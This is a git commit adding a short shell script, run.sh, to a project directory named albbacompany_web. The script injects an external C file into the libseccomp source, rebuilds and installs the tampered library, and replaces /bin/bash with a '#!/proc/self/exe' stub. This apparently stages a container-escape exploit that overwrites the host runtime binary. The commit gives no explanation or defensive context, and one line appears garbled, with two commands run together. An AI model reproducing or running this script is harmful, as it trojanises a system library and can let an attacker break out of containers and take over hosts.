ff8f18fd49f0c71381c33bf7c154f6e3d68ac7cc
Minseo Kim <86199517+seoyamin@users.noreply.github.com>
2025-03-28 15:13:02 +0900

    Create run.sh

---
+++ albbacompany_web/run.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+cd /root/libseccomp-2.3.1
+cat /root/stage1.c >> src/api.c
+DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us
+dpkg -i /root/*.deb
+mv /bin/bash /bin/good_bashgcc /root/stage2.c -o /stage2
+cat >/bin/bash <<EOF
+#!/proc/self/exe
+EOF
+chmod +x /bin/bash
